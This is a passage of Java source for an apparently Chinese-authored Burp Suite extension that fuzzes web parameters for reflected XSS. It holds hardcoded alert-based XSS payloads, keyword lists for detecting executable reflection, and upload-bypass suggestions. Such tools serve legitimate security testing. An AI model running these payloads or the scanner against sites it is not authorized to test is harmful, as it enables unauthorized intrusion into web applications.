        requestPanel.setBorder(BorderFactory.createTitledBorder("Request"));
        requestPanel.add(requestViewer.getComponent(), BorderLayout.CENTER);

        JPanel responsePanel = new JPanel(new BorderLayout());
        responsePanel.setBorder(BorderFactory.createTitledBorder("Response"));
        responsePanel.add(responseViewer.getComponent(), BorderLayout.CENTER);

        JSplitPane messageSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, requestPanel, responsePanel);
        messageSplit.setResizeWeight(0.5);
        detailsCardLayout = new CardLayout();
        detailsCardPanel = new JPanel(detailsCardLayout);

        JPanel placeholder = new JPanel(new BorderLayout());
        placeholder.add(new JLabel("点击上方记录后才显示 Request/Response"), BorderLayout.CENTER);
        detailsCardPanel.add(placeholder, DETAILS_CARD_PLACEHOLDER);
        detailsCardPanel.add(messageSplit, DETAILS_CARD_MESSAGES);
        detailsCardLayout.show(detailsCardPanel, DETAILS_CARD_PLACEHOLDER);

        messagesPanel.add(detailsCardPanel, BorderLayout.CENTER);
        findingsTable.addMouseListener(new MouseAdapter() {
            @Override
            public void mousePressed(MouseEvent e) {
                int row = findingsTable.rowAtPoint(e.getPoint());
                if (row < 0) {
                    findingsTable.clearSelection();
                }
            }
        });

        JSplitPane mainSplit = new JSplitPane(
                JSplitPane.VERTICAL_SPLIT,
                new JScrollPane(findingsTable),
                messagesPanel
        );
        mainSplit.setResizeWeight(0.35);

        mainPanel = new JPanel(new BorderLayout());
        mainPanel.setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));
        mainPanel.add(settingsPanel, BorderLayout.NORTH);
        mainPanel.add(mainSplit, BorderLayout.CENTER);
    }

    private JPanel buildSettingsPanel() {
        JPanel p = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 0));

        JCheckBox passiveEnabledBox = new JCheckBox("Passive fuzz", passiveEnabled);
        passiveEnabledBox.addActionListener(e -> {
            passiveEnabled = passiveEnabledBox.isSelected();
            saveSettings();
            rebuildPassiveExecutor();
        });
        p.add(passiveEnabledBox);

        p.add(new JLabel("Threads"));
        JSpinner passiveThreadsSpinner = new JSpinner(new SpinnerNumberModel(passiveThreads, 1, 12, 1));
        passiveThreadsSpinner.addChangeListener((ChangeListener) e -> {
            passiveThreads = ((Number) passiveThreadsSpinner.getValue()).intValue();
            saveSettings();
            rebuildPassiveExecutor();
        });
        p.add(passiveThreadsSpinner);

        p.add(new JLabel("Queue"));
        JSpinner passiveQueueSpinner = new JSpinner(new SpinnerNumberModel(passiveQueueSize, 50, 5000, 50));
        passiveQueueSpinner.addChangeListener((ChangeListener) e -> {
            passiveQueueSize = ((Number) passiveQueueSpinner.getValue()).intValue();
            saveSettings();
            rebuildPassiveExecutor();
        });
        p.add(passiveQueueSpinner);

        p.add(new JLabel("Passive max/param (0=all)"));
        JSpinner passiveMaxSpinner = new JSpinner(new SpinnerNumberModel(passiveMaxPayloadsPerParam, 0, 20000, 1));
        passiveMaxSpinner.addChangeListener((ChangeListener) e -> {
            passiveMaxPayloadsPerParam = ((Number) passiveMaxSpinner.getValue()).intValue();
            saveSettings();
        });
        p.add(passiveMaxSpinner);

        p.add(new JLabel("Txt payload limit (0=all)"));
        JSpinner fileLimitSpinner = new JSpinner(new SpinnerNumberModel(passiveFilePayloadLimit, 0, 200, 1));
        fileLimitSpinner.addChangeListener((ChangeListener) e -> {
            passiveFilePayloadLimit = ((Number) fileLimitSpinner.getValue()).intValue();
            saveSettings();
        });
        p.add(fileLimitSpinner);

        p.add(new JLabel("Active max/point"));
        JSpinner activeMaxSpinner = new JSpinner(new SpinnerNumberModel(activeMaxPayloadsPerPoint, 1, 200, 1));
        activeMaxSpinner.addChangeListener((ChangeListener) e -> {
            activeMaxPayloadsPerPoint = ((Number) activeMaxSpinner.getValue()).intValue();
            saveSettings();
        });
        p.add(activeMaxSpinner);

        JCheckBox bruteBox = new JCheckBox("Brute fuzz", bruteFuzzEnabled);
        bruteBox.addActionListener(e -> {
            bruteFuzzEnabled = bruteBox.isSelected();
            saveSettings();
        });
        p.add(bruteBox);

        JCheckBox headerBox = new JCheckBox("Header fuzz", headerFuzzEnabled);
        headerBox.addActionListener(e -> {
            headerFuzzEnabled = headerBox.isSelected();
            saveSettings();
        });
        p.add(headerBox);

        p.add(new JLabel("Blacklist Domains (comma-separated):"));
        JTextArea blacklistArea = new JTextArea(3, 40);
        blacklistArea.setText(blacklistDomainsText == null ? "" : blacklistDomainsText);
        blacklistArea.setLineWrap(true);
        JScrollPane blacklistScroll = new JScrollPane(blacklistArea);
        p.add(blacklistScroll);

        JButton saveBlacklistButton = new JButton("Save Blacklist");
        saveBlacklistButton.addActionListener(e -> {
            blacklistDomainsText = blacklistArea.getText();
            blacklistDomains = parseBlacklistDomains(blacklistDomainsText);
            saveSettings();
        });
        p.add(saveBlacklistButton);

        JButton clearStop = new JButton("Clear hit-stop");
        clearStop.addActionListener(e -> {
            triggeredKeys.clear();
            callbacks.printOutput("[" + EXTENSION_NAME + "] hit-stop cleared");
        });
        p.add(clearStop);

        JButton fuzzHeaders = new JButton("Fuzz headers");
        fuzzHeaders.addActionListener(e -> fuzzHeadersBySelectedAsync(fuzzHeaders));
        p.add(fuzzHeaders);

        JButton selectAll = new JButton("Select all");
        selectAll.addActionListener(e -> {
            if (findingsTable != null) {
                findingsTable.selectAll();
            }
        });
        p.add(selectAll);

        JButton clearSelected = new JButton("Clear selected");
        clearSelected.addActionListener(e -> clearSelectedAsync(clearSelected));
        p.add(clearSelected);

        JButton clearHistory = new JButton("Clear history");
        clearHistory.addActionListener(e -> clearHistoryAsync(clearHistory));
        p.add(clearHistory);

        return p;
    }

    private void loadSettings() {
        passiveEnabled = loadBoolSetting(SETTING_PASSIVE_ENABLED, true);
        passiveThreads = loadIntSetting(SETTING_PASSIVE_THREADS, DEFAULT_PASSIVE_THREADS, 1, 12);
        passiveQueueSize = loadIntSetting(SETTING_PASSIVE_QUEUE, DEFAULT_PASSIVE_QUEUE, 50, 5000);
        passiveMaxPayloadsPerParam = loadIntSetting(SETTING_PASSIVE_MAX_PER_PARAM, DEFAULT_PASSIVE_MAX_PER_PARAM, 0, 20000);
        passiveFilePayloadLimit = loadIntSetting(SETTING_PASSIVE_FILE_LIMIT, DEFAULT_PASSIVE_FILE_LIMIT, 0, 200);
        activeMaxPayloadsPerPoint = loadIntSetting(SETTING_ACTIVE_MAX_PER_POINT, DEFAULT_ACTIVE_MAX_PER_POINT, 1, 200);
        bruteFuzzEnabled = loadBoolSetting(SETTING_BRUTE_FUZZ_ENABLED, false);
        headerFuzzEnabled = loadBoolSetting(SETTING_HEADER_FUZZ_ENABLED, false);
        blacklistDomainsText = loadStringSetting(SETTING_BLACKLIST_DOMAINS, "");
        blacklistDomains = parseBlacklistDomains(blacklistDomainsText);
    }

    private void saveSettings() {
        callbacks.saveExtensionSetting(SETTING_PASSIVE_ENABLED, Boolean.toString(passiveEnabled));
        callbacks.saveExtensionSetting(SETTING_PASSIVE_THREADS, Integer.toString(passiveThreads));
        callbacks.saveExtensionSetting(SETTING_PASSIVE_QUEUE, Integer.toString(passiveQueueSize));
        callbacks.saveExtensionSetting(SETTING_PASSIVE_MAX_PER_PARAM, Integer.toString(passiveMaxPayloadsPerParam));
        callbacks.saveExtensionSetting(SETTING_PASSIVE_FILE_LIMIT, Integer.toString(passiveFilePayloadLimit));
        callbacks.saveExtensionSetting(SETTING_ACTIVE_MAX_PER_POINT, Integer.toString(activeMaxPayloadsPerPoint));
        callbacks.saveExtensionSetting(SETTING_BRUTE_FUZZ_ENABLED, Boolean.toString(bruteFuzzEnabled));
        callbacks.saveExtensionSetting(SETTING_HEADER_FUZZ_ENABLED, Boolean.toString(headerFuzzEnabled));
        callbacks.saveExtensionSetting(SETTING_BLACKLIST_DOMAINS, blacklistDomainsText == null ? "" : blacklistDomainsText);
    }

    private int loadIntSetting(String key, int def, int min, int max) {
        String v = callbacks.loadExtensionSetting(key);
        if (v == null) {
            return def;
        }
        try {
            int parsed = Integer.parseInt(v.trim());
            if (parsed < min) {
                return min;
            }
            if (parsed > max) {
                return max;
            }
            return parsed;
        } catch (Exception ignored) {
            return def;
        }
    }

    private boolean loadBoolSetting(String key, boolean def) {
        String v = callbacks.loadExtensionSetting(key);
        if (v == null) {
            return def;
        }
        String t = v.trim().toLowerCase(Locale.ROOT);
        return "true".equals(t) || "1".equals(t) || "yes".equals(t);
    }

    private String loadStringSetting(String key, String def) {
        String v = callbacks.loadExtensionSetting(key);
        if (v == null) {
            return def;
        }
        return v;
    }

    private void rebuildPassiveExecutor() {
        ExecutorService prev = passiveFuzzExecutor;
        passiveFuzzExecutor = null;
        if (prev != null) {
            prev.shutdownNow();
        }
        if (!passiveEnabled) {
            return;
        }
        AtomicInteger seq = new AtomicInteger(1);
        ThreadFactory tf = r -> {
            Thread t = new Thread(r, "PassiveXSS-Worker-" + seq.getAndIncrement());
            t.setDaemon(true);
            try {
                t.setPriority(Math.max(Thread.MIN_PRIORITY, Thread.NORM_PRIORITY - 1));
            } catch (Exception ignored) {
            }
            return t;
        };
        ThreadPoolExecutor exec = new ThreadPoolExecutor(
                passiveThreads,
                passiveThreads,
                10L,
                TimeUnit.SECONDS,
                new ArrayBlockingQueue<>(passiveQueueSize),
                tf,
                new ThreadPoolExecutor.DiscardPolicy()
        );
        try {
            exec.allowCoreThreadTimeOut(true);
        } catch (Exception ignored) {
        }
        exec.prestartAllCoreThreads();
        passiveFuzzExecutor = exec;
    }

    private void onSelectionChanged(ListSelectionEvent e) {
        if (e.getValueIsAdjusting()) {
            return;
        }
        int[] rows = findingsTable.getSelectedRows();
        if (rows == null || rows.length != 1) {
            selectedFinding = null;
            requestViewer.setMessage(null, true);
            responseViewer.setMessage(null, false);
            if (detailsCardLayout != null && detailsCardPanel != null) {
                detailsCardLayout.show(detailsCardPanel, DETAILS_CARD_PLACEHOLDER);
            }
            return;
        }
        int row = rows[0];

        Finding finding;
        synchronized (findingsLock) {
            if (row >= findings.size()) {
                return;
            }
            finding = findings.get(row);
        }

        selectedFinding = finding;
        requestViewer.setMessage(finding.http.getRequest(), true);
        responseViewer.setMessage(finding.http.getResponse(), false);
        if (detailsCardLayout != null && detailsCardPanel != null) {
            detailsCardLayout.show(detailsCardPanel, DETAILS_CARD_MESSAGES);
        }
    }

    @Override
    public String getTabCaption() {
        return "Passive XSS";
    }

    @Override
    public JComponent getUiComponent() {
        return mainPanel;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = requestInfo.getUrl();
        if (shouldSkipByPath(url)) {
            return null;
        }

        byte[] responseBytes = baseRequestResponse.getResponse();
        IResponseInfo responseInfo = responseBytes == null ? null : helpers.analyzeResponse(responseBytes);

        List<IScanIssue> issues = new ArrayList<>();
        if (responseInfo != null && responseBytes != null && responseBytes.length > 0 && isCandidateResponse(responseInfo.getHeaders())) {
            int bodyOffset = responseInfo.getBodyOffset();
            String responseText = helpers.bytesToString(responseBytes);
            if (bodyOffset < responseText.length()) {
                String body = responseText.substring(bodyOffset);
                if (passiveEnabled) {
                    queuePassiveConfirmJobs(baseRequestResponse, requestInfo, url, body);
                }
            }
        }

        issues.addAll(scanFileUploadFuzz(baseRequestResponse, requestInfo, url));

        return issues.isEmpty() ? null : issues;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] baseResponse = baseRequestResponse.getResponse();
        if (baseResponse == null || baseResponse.length == 0) {
            return null;
        }

        IResponseInfo baseResponseInfo = helpers.analyzeResponse(baseResponse);
        if (!isCandidateResponse(baseResponseInfo.getHeaders())) {
            return null;
        }

        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = requestInfo.getUrl();
        if (shouldSkip(url, baseRequestResponse.getHttpService())) {
            return null;
        }
        String pointName = insertionPoint.getInsertionPointName();

        String targetKey = buildTargetKey(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url, "ACTIVE", pointName);
        if (triggeredKeys.contains(targetKey)) {
            return null;
        }

        List<String> payloads = buildActiveCandidates();
        int max = Math.min(payloads.size(), activeMaxPayloadsPerPoint);
        for (int i = 0; i < max; i++) {
            String payload = payloads.get(i);
            if (payload == null) {
                continue;
            }
            payload = payload.trim();
            if (payload.isEmpty()) {
                continue;
            }

            byte[] attackRequest = insertionPoint.buildRequest(helpers.stringToBytes(payload));
            attackRequest = addMarkerHeader(attackRequest);
            IHttpRequestResponse attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attackRequest);
            byte[] attackResponse = attack.getResponse();
            if (attackResponse == null || attackResponse.length == 0) {
                continue;
            }
            IResponseInfo attackResponseInfo = helpers.analyzeResponse(attackResponse);
            if (!isCandidateResponse(attackResponseInfo.getHeaders())) {
                continue;
            }

            if (!responseReflectsPayload(attackResponse, attackResponseInfo.getBodyOffset(), payload)) {
                continue;
            }

            IHttpRequestResponsePersisted persisted = callbacks.saveBuffersToTempFiles(attack);
            String issueName = "XSS成功 (插入点: " + pointName + ")";
            String severity = "High";
            String confidence = "Certain";

            IScanIssue issue = new GenericIssue(
                    url,
                    issueName,
                    buildTriggeredXssIssueDetail("插入点", pointName, payload),
                    severity,
                    confidence,
                    new IHttpRequestResponse[]{persisted},
                    persisted.getHttpService()
            );

            triggeredKeys.add(targetKey);
            String uiKey = url.toString() + "|XSS成功|ACTIVE|" + pointName;
            if (seen.add(uiKey)) {
                addFinding(new Finding(
                        Instant.now().toEpochMilli(),
                        "XSS成功",
                        url,
                        requestInfo.getMethod(),
                        pointName,
                        severity,
                        confidence,
                        persisted
                ));
            }

            return Collections.singletonList(issue);
        }

        return null;
    }

    private List<String> getActivePayloads() {
        List<String> cached = activePayloads;
        if (cached != null) {
            return cached;
        }
        synchronized (payloadsLock) {
            if (activePayloads != null) {
                return activePayloads;
            }
            activePayloads = loadPayloadsFromResource();
            Set<String> s = new HashSet<>();
            for (String p : activePayloads) {
                if (p == null) {
                    continue;
                }
                String v = p.trim();
                if (!v.isEmpty()) {
                    s.add(v);
                }
            }
            activePayloadSet = s;
            return activePayloads;
        }
    }

    private Set<String> getActivePayloadSet() {
        Set<String> s = activePayloadSet;
        if (s != null) {
            return s;
        }
        getActivePayloads();
        return activePayloadSet == null ? Collections.emptySet() : activePayloadSet;
    }

    private List<String> loadPayloadsFromResource() {
        InputStream in = BurpExtender.class.getResourceAsStream("/easyXssPayload.txt");
        if (in == null) {
            List<String> fallback = new ArrayList<>();
            fallback.add("<script>alert(1)</script>");
            fallback.add("\"><svg/onload=alert(1)>");
            fallback.add("<img src=x onerror=alert(1)>");
            return fallback;
        }
        List<String> out = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) {
                String v = line.trim();
                if (v.isEmpty()) {
                    continue;
                }
                out.add(v);
            }
        } catch (Exception ignored) {
            List<String> fallback = new ArrayList<>();
            fallback.add("<script>alert(1)</script>");
            fallback.add("\"><svg/onload=alert(1)>");
            fallback.add("<img src=x onerror=alert(1)>");
            return fallback;
        }
        return out;
    }

    private boolean responseReflectsPayload(byte[] responseBytes, int bodyOffset, String payload) {
        String responseText = helpers.bytesToString(responseBytes);
        if (bodyOffset < 0 || bodyOffset >= responseText.length()) {
            return false;
        }
        String body = responseText.substring(bodyOffset);
        if (payload == null) {
            return false;
        }
        List<String> candidates = new ArrayList<>();
        candidates.add(payload);
        try {
            candidates.add(helpers.urlDecode(payload));
        } catch (Exception ignored) {
        }
        for (String c : candidates) {
            if (c == null) {
                continue;
            }
            String v = c.trim();
            if (v.length() < 3) {
                continue;
            }
            int from = 0;
            while (true) {
                int idx = body.indexOf(v, from);
                if (idx < 0) {
                    break;
                }
                if (isLikelyExecutableReflection(body, idx, v)) {
                    return true;
                }
                from = idx + Math.max(1, v.length());
                if (from >= body.length()) {
                    break;
                }
            }
        }
        return false;
    }

    private static boolean isLikelyExecutableReflection(String body, int reflectedIndex, String reflectedValue) {
        if (body == null || reflectedValue == null) {
            return false;
        }
        String v = reflectedValue.trim();
        if (v.length() < 3) {
            return false;
        }
        String lower = v.toLowerCase(Locale.ROOT);
        ReflectionContext ctx = detectReflectionContext(body, Math.max(0, reflectedIndex));

        if (ctx != null && ctx.inScript) {
            return lower.contains("alert(")
                    || lower.contains("prompt(")
                    || lower.contains("confirm(")
                    || lower.contains("eval(")
                    || lower.contains("function(")
                    || lower.contains("settimeout(")
                    || lower.contains("javascript:");
        }

        int start = Math.max(0, reflectedIndex - 120);
        int end = Math.min(body.length(), reflectedIndex + v.length() + 120);
        String around = body.substring(start, end);
        String aroundLower = around.toLowerCase(Locale.ROOT);

        if (looksLikeTagInjection(lower)) {
            return true;
        }

        if (containsEventHandler(lower)) {
            if (ctx != null && ctx.inAttribute) {
                return true;
            }
            int lt = aroundLower.lastIndexOf('<', Math.max(0, reflectedIndex - start));
            int gt = aroundLower.indexOf('>', Math.max(0, reflectedIndex - start));
            return lt >= 0 && gt > lt;
        }

        if (lower.contains("javascript:")) {
            if (ctx != null && ctx.inAttribute) {
                return true;
            }
            return containsHrefLikeContext(aroundLower, reflectedIndex - start);
        }

        if (lower.contains("\"><") || lower.contains("'><") || lower.contains("`><") || lower.contains("\"><svg")
                || lower.contains("\"><script") || lower.contains("\"><img") || lower.contains("\"><iframe")) {
            return true;
        }

        return false;
    }

    private static boolean looksLikeTagInjection(String lowerValue) {
        return lowerValue.contains("<script")
                || lowerValue.contains("<svg")
                || lowerValue.contains("<img")
                || lowerValue.contains("<iframe")
                || lowerValue.contains("<object")
                || lowerValue.contains("<embed")
                || lowerValue.contains("<math")
                || lowerValue.contains("<body")
                || lowerValue.contains("<marquee")
                || lowerValue.contains("<a ");
    }

    private static boolean containsEventHandler(String lowerValue) {
        if (lowerValue == null) {
            return false;
        }
        return lowerValue.contains("onload=")
                || lowerValue.contains("onclick=")
                || lowerValue.contains("onerror=")
                || lowerValue.contains("onmouseover=")
                || lowerValue.contains("onfocus=")
                || lowerValue.contains("onpageshow=")
                || lowerValue.contains("onhashchange=")
                || lowerValue.contains("onscroll=")
                || lowerValue.contains("onmouseenter=")
                || lowerValue.contains("onmouseleave=")
                || lowerValue.contains("oninput=")
                || lowerValue.contains("onkeydown=")
                || lowerValue.contains("onkeyup=");
    }

    private static boolean containsHrefLikeContext(String aroundLower, int centerIndex) {
        int from = Math.max(0, centerIndex - 80);
        int to = Math.min(aroundLower.length(), centerIndex + 10);
        String before = aroundLower.substring(from, to);
        return before.contains("href=")
                || before.contains("src=")
                || before.contains("action=")
                || before.contains("formaction=")
                || before.contains("data=");
    }

    private static String buildTriggeredXssIssueDetail(String targetLabel, String targetName, String payload) {
        StringBuilder sb = new StringBuilder();
        sb.append("响应中出现了 payload 的可执行方式反射（例如标签/事件/JS URL/脚本上下文），视为 XSS 触发成功。<br>");
        sb.append("<br>");
        sb.append(htmlEscape(targetLabel)).append("：<b>").append(htmlEscape(targetName)).append("</b><br>");
        sb.append("触发 payload：<code>").append(htmlEscape(payload)).append("</code><br>");
        sb.append("<br>");
        sb.append("为避免大规模发包，该目标一旦触发将不再继续尝试其它 payload。");
        return sb.toString();
    }

    private void queuePassiveConfirmJobs(IHttpRequestResponse baseRequestResponse,
                                        IRequestInfo requestInfo,
                                        URL url,
                                        String responseBody) {
        byte[] baseRequest = baseRequestResponse.getRequest();
        if (baseRequest == null || baseRequest.length == 0) {
            return;
        }

        String packetKeyPrefix = buildPacketKeyPrefix(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url, requestInfo, baseRequest);

        boolean pathGateChecked = false;
        boolean pathGateAllowed = false;

        for (IParameter parameter : requestInfo.getParameters()) {
            if (parameter.getType() != IParameter.PARAM_URL && parameter.getType() != IParameter.PARAM_BODY) {
                continue;
            }

            String rawValue = parameter.getValue();
            if (rawValue == null) {
                continue;
            }

            String decodedValue;
            try {
                decodedValue = helpers.urlDecode(rawValue);
            } catch (Exception ignored) {
                decodedValue = rawValue;
            }

            ReflectionMatch match = firstReflectionMatch(responseBody, rawValue, decodedValue);
            if (match == null) {
                continue;
            }

            if (!pathGateChecked) {
                pathGateAllowed = allowAndRecordByPathRule(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url, requestInfo, baseRequest);
                pathGateChecked = true;
                if (!pathGateAllowed) {
                    return;
                }
            }

            String targetName = parameter.getName();
            String targetKey = buildTargetKey(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url, "PASSIVE", targetName);
            if (triggeredKeys.contains(targetKey)) {
                continue;
            }

            String packetKey = packetKeyPrefix + "|PASSIVE|" + parameter.getType() + "|" + targetName;
            if (!attemptedPacketKeys.add(packetKey)) {
                continue;
            }

            if (!queuedKeys.add(packetKey)) {
                continue;
            }

            ExecutorService exec = passiveFuzzExecutor;
            if (exec == null) {
                queuedKeys.remove(packetKey);
                return;
            }

            exec.execute(() -> {
                try {
                    confirmOneParamByPassiveSending(baseRequestResponse, requestInfo, url, responseBody, match.index, parameter, targetKey);
                } catch (Exception ignored) {
                } finally {
                    queuedKeys.remove(packetKey);
                }
            });
        }
    }

    private List<IScanIssue> scanFileUploadFuzz(IHttpRequestResponse baseRequestResponse, IRequestInfo requestInfo, URL url) {
        byte[] requestBytes = baseRequestResponse.getRequest();
        if (requestBytes == null || requestBytes.length == 0) {
            return Collections.emptyList();
        }

        MultipartInfo multipartInfo = parseMultipartRequest(requestBytes, requestInfo);
        if (multipartInfo == null || multipartInfo.fileParts.isEmpty()) {
            return Collections.emptyList();
        }

        String issueName = "Upload Fuzz Suggestions (SVG/PDF/HTML)";
        String severity = "Information";
        String confidence = "Tentative";

        IHttpRequestResponsePersisted persisted = callbacks.saveBuffersToTempFiles(baseRequestResponse);
        IScanIssue issue = new GenericIssue(
                url,
                issueName,
                buildUploadIssueDetail(multipartInfo),
                severity,
                confidence,
                new IHttpRequestResponse[]{persisted},
                persisted.getHttpService()
        );

        String key = url.toString() + "|UPLOAD|" + multipartInfo.summaryKey();
        if (seen.add(key)) {
            addFinding(new Finding(
                    Instant.now().toEpochMilli(),
                    "UPLOAD",
                    url,
                    requestInfo.getMethod(),
                    multipartInfo.summaryKey(),
                    severity,
                    confidence,
                    persisted
            ));
        }

        return Collections.singletonList(issue);
    }

    private void addFinding(Finding finding) {
        SwingUtilities.invokeLater(() -> {
            int row;
            synchronized (findingsLock) {
                findings.add(finding);
                row = findings.size() - 1;
            }
            tableModel.fireTableRowsInserted(row, row);
        });
    }

    private static ReflectionMatch firstReflectionMatch(String responseBody, String rawValue, String decodedValue) {
        if (rawValue != null && rawValue.length() >= 3) {
            int idx = responseBody.indexOf(rawValue);
            if (idx >= 0) {
                return new ReflectionMatch(rawValue, idx);
            }
        }
        if (decodedValue != null && decodedValue.length() >= 3) {
            int idx = responseBody.indexOf(decodedValue);
            if (idx >= 0) {
                return new ReflectionMatch(decodedValue, idx);
            }
        }
        return null;
    }

    private static boolean isHighConfidenceValue(String value) {
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (c == '<' || c == '>' || c == '"' || c == '\'' || c == '`') {
                return true;
            }
        }
        return false;
    }

    private static boolean isCandidateResponse(List<String> headers) {
        String contentType = null;
        for (String header : headers) {
            int idx = header.indexOf(':');
            if (idx <= 0) {
                continue;
            }
            String name = header.substring(0, idx).trim().toLowerCase(Locale.ROOT);
            if (!"content-type".equals(name)) {
                continue;
            }
            contentType = header.substring(idx + 1).trim().toLowerCase(Locale.ROOT);
            break;
        }
        if (contentType == null) {
            return true;
        }
        return contentType.contains("text/html")
                || contentType.contains("application/xhtml")
                || contentType.contains("text/plain")
                || contentType.contains("application/json")
                || contentType.contains("text/json")
                || contentType.contains("application/javascript")
                || contentType.contains("text/javascript")
                || contentType.contains("application/xml")
                || contentType.contains("text/xml");
    }

    private static boolean shouldSkipByPath(URL url) {
        if (url == null) {
            return false;
        }
        String path = url.getPath();
        if (path == null) {
            return false;
        }
        String p = path.toLowerCase(Locale.ROOT);
        return p.endsWith(".js")
                || p.endsWith(".css")
                || p.endsWith(".png")
                || p.endsWith(".jpg")
                || p.endsWith(".jpeg")
                || p.endsWith(".gif")
                || p.endsWith(".ico")
                || p.endsWith(".woff")
                || p.endsWith(".woff2")
                || p.endsWith(".ttf")
                || p.endsWith(".eot")
                || p.endsWith(".map");
    }

    private boolean shouldSkip(URL url, IHttpService service) {
        if (url == null && service == null) {
            return false;
        }
        if (shouldSkipByPath(url)) {
            return true;
        }
        if (isDomainBlacklisted(url, service)) {
            return true;
        }
        return false;
    }

    private boolean isDomainBlacklisted(URL url, IHttpService service) {
        List<String> domains = blacklistDomains;
        if (domains == null || domains.isEmpty()) {
            return false;
        }
        String host = null;
        if (url != null) {
            host = url.getHost();
        }
        if ((host == null || host.trim().isEmpty()) && service != null) {
            host = service.getHost();
        }
        if (host == null) {
            return false;
        }
        String h = host.trim().toLowerCase(Locale.ROOT);
        if (h.isEmpty()) {
            return false;
        }
        for (String d : domains) {
            if (d == null) {
                continue;
            }
            String dd = d.trim().toLowerCase(Locale.ROOT);
            if (dd.isEmpty()) {
                continue;
            }
            if (h.equals(dd) || h.endsWith("." + dd) || h.endsWith(dd)) {
                return true;
            }
        }
        return false;
    }

    private static List<String> parseBlacklistDomains(String text) {
        if (text == null) {
            return Collections.emptyList();
        }
        String t = text.trim();
        if (t.isEmpty()) {
            return Collections.emptyList();
        }
        String[] parts = t.split("[,\\s]+");
        LinkedHashSet<String> out = new LinkedHashSet<>();
        for (String p : parts) {
            if (p == null) {
                continue;
            }
            String v = p.trim().toLowerCase(Locale.ROOT);
            if (v.isEmpty()) {
                continue;
            }
            if (v.startsWith("http://")) {
                v = v.substring("http://".length());
            } else if (v.startsWith("https://")) {
                v = v.substring("https://".length());
            }
            int slash = v.indexOf('/');
            if (slash >= 0) {
                v = v.substring(0, slash);
            }
            int at = v.lastIndexOf('@');
            if (at >= 0) {
                v = v.substring(at + 1);
            }
            int colon = v.indexOf(':');
            if (colon >= 0) {
                v = v.substring(0, colon);
            }
            while (v.startsWith(".")) {
                v = v.substring(1);
            }
            if (v.startsWith("*.")) {
                v = v.substring(2);
            }
            if (!v.isEmpty()) {
                out.add(v);
            }
        }
        if (out.isEmpty()) {
            return Collections.emptyList();
        }
        return new ArrayList<>(out);
    }

    private static String buildXssIssueDetail(String paramName, String reflectedValue, List<String> payloads) {
        StringBuilder sb = new StringBuilder();
        sb.append("该请求参数在响应中被原样反射，可能存在反射型 XSS 风险。<br>");
        sb.append("<br>");
        sb.append("参数名：<b>").append(htmlEscape(paramName)).append("</b><br>");
        sb.append("反射值：<code>").append(htmlEscape(reflectedValue)).append("</code><br>");
        if (payloads != null && !payloads.isEmpty()) {
            sb.append("<br>");
            sb.append("建议绕过 payload：<br>");
            for (String p : payloads) {
                sb.append("<code>").append(htmlEscape(p)).append("</code><br>");
            }
        }
        return sb.toString();
    }

    private static String buildUploadIssueDetail(MultipartInfo multipartInfo) {
        StringBuilder sb = new StringBuilder();
        sb.append("检测到 multipart/form-data 文件上传请求，可尝试上传 SVG/PDF/HTML 进行安全测试。<br>");
        sb.append("<br>");
        sb.append("发现的文件字段：<br>");
        for (MultipartFilePart part : multipartInfo.fileParts) {
            sb.append("name=<b>").append(htmlEscape(part.fieldName)).append("</b>");
            sb.append(" filename=<code>").append(htmlEscape(part.filename)).append("</code>");
            if (part.contentType != null && !part.contentType.trim().isEmpty()) {
                sb.append(" content-type=<code>").append(htmlEscape(part.contentType)).append("</code>");
            }
            sb.append("<br>");
        }
        sb.append("<br>");
        sb.append("文件名绕过建议：<br>");
        for (String name : uploadFilenameBypassCandidates()) {
            sb.append("<code>").append(htmlEscape(name)).append("</code><br>");
        }
        sb.append("<br>");
        sb.append("内容样例（可作为 fuzz 起点）：<br>");
        sb.append("<b>SVG</b><br>");
        sb.append("<pre>").append(htmlEscape(sampleSvgPayload())).append("</pre>");
        sb.append("<b>HTML</b><br>");
        sb.append("<pre>").append(htmlEscape(sampleHtmlPayload())).append("</pre>");
        sb.append("<b>PDF</b><br>");
        sb.append("<pre>").append(htmlEscape(samplePdfPayload())).append("</pre>");
        return sb.toString();
    }

    private static String htmlEscape(String s) {
        if (s == null) {
            return "";
        }
        String out = s;
        out = out.replace("&", "&amp;");
        out = out.replace("<", "&lt;");
        out = out.replace(">", "&gt;");
        out = out.replace("\"", "&quot;");
        out = out.replace("'", "&#39;");
        return out;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue == null || newIssue == null) {
            return 0;
        }
        if (Objects.equals(existingIssue.getUrl(), newIssue.getUrl())
                && Objects.equals(existingIssue.getIssueName(), newIssue.getIssueName())) {
            return -1;
        }
        return 0;
    }

    @Override
    public IHttpService getHttpService() {
        Finding finding = selectedFinding;
        return finding == null ? null : finding.http.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        Finding finding = selectedFinding;
        return finding == null ? null : finding.http.getRequest();
    }

    @Override
    public byte[] getResponse() {
        Finding finding = selectedFinding;
        return finding == null ? null : finding.http.getResponse();
    }

    private static final class Finding {
        private final long timestampMillis;
        private final String timeIso;
        private final String type;
        private final URL url;
        private final String urlString;
        private final String method;
        private final String target;
        private final String severity;
        private final String confidence;
        private final IHttpRequestResponsePersisted http;

        private Finding(long timestampMillis,
                        String type,
                        URL url,
                        String method,
                        String target,
                        String severity,
                        String confidence,
                        IHttpRequestResponsePersisted http) {
            this.timestampMillis = timestampMillis;
            this.timeIso = Instant.ofEpochMilli(timestampMillis).toString();
            this.type = type;
            this.url = url;
            this.urlString = url == null ? "" : url.toString();
            this.method = method;
